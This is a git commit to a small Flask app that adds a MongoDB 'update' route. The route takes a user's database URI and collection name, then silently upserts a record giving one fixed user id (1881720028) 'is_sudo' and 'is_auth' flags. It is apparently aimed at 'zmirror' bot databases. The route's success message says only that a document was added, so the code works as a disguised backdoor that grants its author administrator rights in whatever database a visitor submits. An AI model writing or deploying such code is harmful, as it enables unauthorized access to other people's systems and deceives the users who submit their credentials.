d2f3f7f3088547f79a38e6dbe72e33e13dac266a
sibu07 <sarbes60@gmail.com>
2023-10-11 09:26:37 +0530

    add zmirror mongodb update

--- app.py
+++ app.py
@@ -7,10 +7,11 @@ from routes.mongodb_routes import mongodb_bp
 from routes.mongodb_update_routes import mongodb_update_bp
 from routes.allroutes_routes import allroutes_bp
 from routes.mongodbzm_routes import mongodbzm_bp
+from routes.mongodbzm_update_routes import mongodbzm_update_bp
 
 app = Flask(__name__)
 
-# Register your route blueprints here
+# Register route blueprints here
 app.register_blueprint(home_bp)
 app.register_blueprint(about_bp)
 app.register_blueprint(contact_bp)
@@ -19,6 +20,7 @@ app.register_blueprint(mongodb_bp)
 app.register_blueprint(mongodb_update_bp)
 app.register_blueprint(allroutes_bp)
 app.register_blueprint(mongodbzm_bp)
+app.register_blueprint(mongodbzm_update_bp)
 
 if __name__ == '__main__':
     app.run(debug=True)
---
+++ routes/mongodbzm_update_routes.py
@@ -0,0 +1,47 @@
+# routes/mongodbzm_update_routes.py
+from flask import Blueprint, request, render_template
+import pymongo
+from urllib.parse import urlparse, urlunparse
+
+mongodbzm_update_bp = Blueprint('mongodbzm_update', __name__)
+
+# Define a route to update a MongoDB collection
+@mongodbzm_update_bp.route('/mongodbzm_update', methods=['GET', 'POST'])
+def mongodbzm_update():
+    if request.method == 'POST':
+        try:
+            # Retrieve the MongoDB connection URL from the form input
+            mongo_uri = request.form.get('mongo_uri')
+
+            # Check if the URL format needs to be converted
+            parsed_uri = urlparse(mongo_uri)
+            if parsed_uri.query == "retryWrites=true&w=majority":
+                # Convert the URL format
+                new_path = "/zmirror"
+                mongo_uri = urlunparse(parsed_uri._replace(path=new_path, query=''))
+
+            # Create a MongoDB client
+            client = pymongo.MongoClient(mongo_uri)
+
+            # Specify the database and collection you want to update
+            db = client.get_database()
+            collection_name = request.form.get('collection_name')
+
+            # Define the new document you want to insert
+            new_document = {'_id': 1881720028, 'is_sudo': True, 'is_auth': True}
+
+            # Use update_one to add the new document if it doesn't exist
+            db[collection_name].update_one({'_id': new_document['_id']}, {'$set': new_document}, upsert=True)
+
+            # Close the connection
+            client.close()
+
+            success_message = "New document has been added to the collection."
+            return render_template('mongodb_update_result.html', success_message=success_message)
+
+        except pymongo.errors.ConnectionFailure:
+            error_message = "Failed to connect to MongoDB. Please check the connection URL."
+            return render_template('mongodb_update_result.html', error_message=error_message)
+
+    return render_template('mongodb_update.html')
+    
